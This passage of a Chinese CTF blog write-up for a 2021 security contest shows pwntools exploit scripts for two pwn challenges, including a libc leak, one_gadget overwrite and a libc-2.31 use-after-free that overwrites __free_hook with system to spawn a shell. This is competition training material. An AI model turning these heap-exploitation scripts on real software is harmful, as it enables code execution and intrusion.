class="line">#io=process(&#x27;./Gpwn3&#x27;)</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10002)</span><br><span class="line">elf=ELF(&#x27;./Gpwn3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create(description):</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendafter(&#x27; level :\n&#x27;,description)</span><br><span class="line"></span><br><span class="line">def power(description):</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendafter(&#x27;another level :&#x27;,description) </span><br><span class="line"></span><br><span class="line">def beat(): </span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def give_up():</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">   </span><br><span class="line">def exp():</span><br><span class="line"> create(&#x27;a&#x27;*35+&#x27;\n&#x27;)</span><br><span class="line"> power(&#x27;a&#x27;)</span><br><span class="line"> power(&#x27;\xff\xff\xff\xff&#x27;)</span><br><span class="line"> beat()</span><br><span class="line"> </span><br><span class="line"> io.recvuntil(&#x27;reward: &#x27;)</span><br><span class="line"> puts=int(io.recv(14),16)</span><br><span class="line"> libc_base=puts-libc.symbols[&#x27;puts&#x27;] </span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"> binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"> dl_rtld_unlock_recursive = libc_base+0x5f0040+3856</span><br><span class="line"> gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]</span><br><span class="line"> #gdb.attach(io)</span><br><span class="line"> io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))</span><br><span class="line"> </span><br><span class="line"> io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn4】"><a href="#【pwn4】" class="headerlink" title="【pwn4】"></a>【pwn4】</h3><p>这个题有个小问题，忘了在add函数后加break跳出switch，因此有师傅修switch时修不出来add，只能看汇编代码，在这里和各位师傅道个歉。</p>
<p>此题的漏洞在free时没有对指针置0，libc-2.31的uaf。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXTTUFE3Jy44ibBoTSzccwib4na7P4qwpcib0PaHISAo3ruVDGbnBM45Wzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn4&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn4&#x27;)</span><br><span class="line">libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,key,value):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line"> io.sendlineafter(&#x27;Please input a key: &#x27;,key)</span><br><span class="line"> io.sendlineafter(&#x27;Please input a value: &#x27;,str(value))</span><br><span class="line"> </span><br><span class="line">def show(index):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,name,length,key,value):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line"> io.sendlineafter(&#x27;New key length: &#x27;,str(length))</span><br><span class="line"> io.sendlineafter(&#x27;Key: &#x27;,key)</span><br><span class="line"> io.sendlineafter(&#x27;Value: &#x27;,str(value))</span><br><span class="line"> </span><br><span class="line">def dele(index):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line"> add(0,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x417,0)</span><br><span class="line"> add(1,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x3c7,1)</span><br><span class="line"> dele(0)</span><br><span class="line"> show(0)</span><br><span class="line"> malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - 96 -16</span><br><span class="line"> libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line"> system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"> </span><br><span class="line"> add(2,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,2)</span><br><span class="line"> add(3,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,3)</span><br><span class="line"> dele(3)</span><br><span class="line"> dele(2)</span><br><span class="line"> #gdb.attach(io)</span><br><span class="line"> edit(1,&#x27;f1ag&#x27;,8,&#x27;/bin/sh\x00&#x27;,1)</span><br><span class="line"> edit(2,&#x27;f1ag&#x27;,6,p32((free_hook-0x51)&amp;0xffffffff)+p16(((free_hook)&gt;&gt;32)&amp;0xffff),2)</span><br><span class="line"> </span><br><span class="line"> add(4,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x51+p32((system)&amp;0xffffffff)+p16(((system)&gt;&gt;32)&amp;0xffff),&#x27;4&#x27;)</span><br><span class="line"> </span><br><span class="line"> #add(6,&#x27;f1ag&#x27;,p64(system),5)</span><br><span class="line"> </span><br><span class="line"> dele(1)</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>余归
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2022/01/09/WriteUp/" title="2021长安“战疫”网络安全卫士守护赛Wp">http://example.com/2022/01/09/WriteUp/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/wp/" rel="tag"># wp</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/12/26/hello-world/" rel="prev" title="Hello World">
      <i class="fa fa-chevron-left"></i> Hello World
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/01/16/%E9%80%86%E5%90%91/" rel="next" title="CTF逆向的简单了解">
      CTF逆向的简单了解 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90%E5%85%AB%E5%8D%A6%E8%BF%B7%E5%AE%AB%E3%80%91"><span class="nav-number">1.0.1.</span> <span class="nav-text">【八卦迷宫】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E7%9A%84%E5%8F%96%E8%AF%81%E3%80%91"><span class="nav-number">1.0.2.</span> <span class="nav-text">【朴实无华的取证】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90%E6%97%A0%E5%AD%97%E5%A4%A9%E4%B9%A6%E3%80%91"><span class="nav-number">1.0.3.</span> <span class="nav-text">【无字天书】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90%E8%A5%BF%E5%AE%89%E5%8A%A0%E6%B2%B9%E3%80%91"><span class="nav-number">1.0.4.</span> <span class="nav-text">【西安加油】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90ez-Encrypt%E3%80%91"><span class="nav-number">1.0.5.</span> <span class="nav-text">【ez_Encrypt】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90binary%E3%80%91"><span class="nav-number">1.0.6.</span> <span class="nav-text">【binary】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90pipicc%E3%80%91"><span class="nav-number">1.0.7.</span> <span class="nav-text">【pipicc】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90lemon%E3%80%91"><span class="nav-number">2.0.1.</span> <span class="nav-text">【lemon】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90hello-py%E3%80%91"><span class="nav-number">2.0.2.</span> <span class="nav-text">【hello_py】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90combat-slogan%E3%80%91"><span class="nav-number">2.0.3.</span> <span class="nav-text">【combat_slogan】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90cute-doge%E3%80%91"><span class="nav-number">2.0.4.</span> <span class="nav-text">【cute_doge】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90SafeIM%E3%80%91"><span class="nav-number">2.0.5.</span> <span class="nav-text">【SafeIM】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">3.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90RCE-No-Para%E3%80%91"><span class="nav-number">3.0.1.</span> <span class="nav-text">【RCE_No_Para】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90Baby-Upload%E3%80%91"><span class="nav-number">3.0.2.</span> <span class="nav-text">【Baby_Upload】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90flask%E3%80%91"><span class="nav-number">3.0.3.</span> <span class="nav-text">【flask】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90Shiro-%E3%80%91"><span class="nav-number">3.0.4.</span> <span class="nav-text">【Shiro?】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90Flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83%E3%80%91"><span class="nav-number">3.0.5.</span> <span class="nav-text">【Flag配送中心】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90tp%E3%80%91"><span class="nav-number">3.0.6.</span> <span class="nav-text">【tp】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90LinearEquations%E3%80%91"><span class="nav-number">4.0.1.</span> <span class="nav-text">【LinearEquations】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90no-can-no-bb%E3%80%91"><span class="nav-number">4.0.2.</span> <span class="nav-text">【no_can_no_bb】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90no-cry-no-can%E3%80%91"><span class="nav-number">4.0.3.</span> <span class="nav-text">【no_cry_no_can】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90no-math-no-cry%E3%80%91"><span class="nav-number">4.0.4.</span> <span class="nav-text">【no_math_no_cry】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90math%E3%80%91"><span class="nav-number">4.0.5.</span> <span class="nav-text">【math】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90pwn1%E3%80%91"><span class="nav-number">5.0.1.</span> <span class="nav-text">【pwn1】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90pwn2%E3%80%91"><span class="nav-number">5.0.2.</span> <span class="nav-text">【pwn2】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90pwn3%E3%80%91"><span class="nav-number">5.0.3.</span> <span class="nav-text">【pwn3】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90pwn4%E3%80%91"><span class="nav-number">5.0.4.</span> <span class="nav-text">【pwn4】</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="余归"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">余归</p>
  <div class="site-description" itemprop="description">Believe not all that you see nor half what you hear.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">30</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>




      
<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
<div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div id="myCanvasContainer" class="widget tagcloud">
        <canvas width="250" height="250" id="resCanvas" style="width=100%">
            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp-CTF/" rel="tag">-wp -CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">27</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tips/" rel="tag">tips</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">18</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a><span class="tag-list-count">1</span></li></ul>
        </canvas>
    </div>
</div>



    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022003013号 </a>
      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000196%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000196号 </a>
  </div>

<div class="copyright">
  
  &copy; Sun Dec 26 2021 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">余归</span>
</div>
  <div class="powered-by">
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date(); 
    function createtime() { 
        var grt= new Date("12/25/2021 17:38:00");
        now.setTime(now.getTime()+250); 
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
        document.getElementById("timeDate").innerHTML = "影影已在此快乐的玩耍了 "+dnum+" 天 "; 
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
    } 
setInterval("createtime()",250);
</script>
<br />








<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">影影的家共种了42.7k朵花</span>
</div>

<br />


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    已经有<span id="busuanzi_value_site_pv"></span>人摘了影影种的花</span>
    <span class="post-meta-divider"> </span>
    其中<span id="busuanzi_value_site_uv"></span>人不留痕迹地跑了</span>
    <span class="post-meta-divider"> </span>





<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>
        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  


  <script src="/js/activate-power-mode.min.js"></script>
  <script>
    POWERMODE.colorful = true;
    POWERMODE.shake = false;
    document.body.addEventListener('input', POWERMODE);
  </script>


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : true,
      appId      : 'vcFyBSklL05djh0SlQ0i9Idk-gzGzoHsz',
      appKey     : 'wFXz2jiwl2Jo3Q5LWDFdhUsv',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>


<script src="/js/cursor.js"></script>

<script type="text/javascript">
//只在桌面版网页启用特效
var windowWidth = $(window).width();
if (windowWidth > 768) {
    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
}
</script>


<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>
